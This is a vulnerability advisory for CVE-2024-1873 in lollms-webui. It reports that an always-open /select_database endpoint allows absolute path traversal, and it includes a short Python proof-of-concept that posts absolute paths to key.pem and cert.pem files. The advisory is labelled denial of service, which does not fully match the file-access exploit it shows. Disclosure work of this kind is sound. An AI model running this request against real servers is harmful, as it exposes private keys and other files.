---
description: CVE-2024-1873, HIGH, Exposed endpoints in lollms-webui leads to denial of service
title: lollms-webui exposed endpoints DoS
date_published: "2024-04-16"
last_updated: "2024-04-16"
xray_id: JFSA-2024-001028816
vul_id: CVE-2024-1873
cvss: 8.2
severity: high
discovered_by: Naveh Racovsky
type: vulnerability

---

## Summary

Exposed endpoints in lollms-webui leads to denial of service

## Component

[parisneo/lollms-webui](https://github.com/parisneo/lollms-webui)

## Affected versions

(,)

## Description

The `/select_database` endpoint is always open, even when the program is exposed to the network. This can have several implications. While at first look the endpoint does implement a basic path traversal protection, by looking for ".." in the filename, it does not prevent absolute path traversal;

## PoC

```bash
// PoC.py
import requests

IP_ADDRESS = "aaa.bbb.ccc.ddd"
PORT = 9600

for file_name in ["key.pem", "cert.pem"]:
    data = {
        "name": f"/home/user/personal_data/certs/{file_name}",
    }
    response = requests.post(f"http://{IP_ADDRESS}:{str(PORT)}/select_database", json=data)
    print(response.json())
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[Advisory](https://huntr.com/bounties/c1cfc0d9-517a-4d0e-bf1c-6444c1fd195d)

